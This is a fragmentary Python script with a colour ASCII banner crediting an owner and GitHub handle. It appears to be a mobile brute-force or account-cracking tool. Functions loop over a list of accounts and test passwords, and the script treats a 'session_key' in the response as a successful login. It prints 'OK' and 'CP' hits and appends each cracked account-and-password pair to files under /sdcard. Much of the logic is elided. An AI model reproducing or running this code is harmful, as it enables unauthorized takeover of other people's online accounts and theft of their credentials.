...
\033[1;35m.  \____  $$| $$__  $$| $$  $$$$| $$__  $$

 \033[1;36m. /$$  \ $$| $$  | $$| $$\  $$$| $$  | $$

\033[1;34m. |  $$$$$$/| $$  | $$| $$ \  $$| $$  | $$

\033[1;32m.  \______/ |__/  |__/|__/  \__/|__/  |__/

\033[1;93m=================================

\033[1;97m Owner  : DANISHSARDAR

\033[1;97m GitHub : Shane404207

\033[1;97m Version: 9.0
...
def method():
    ...
    def start(user):
     ...
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mSANA-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mSANA-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/SANA-OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mSANA-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/SANA-CP.txt','a').write(f'{acc} • {pword}\n')
    ...
    def start2(user):
      ...
      try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mSANA-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
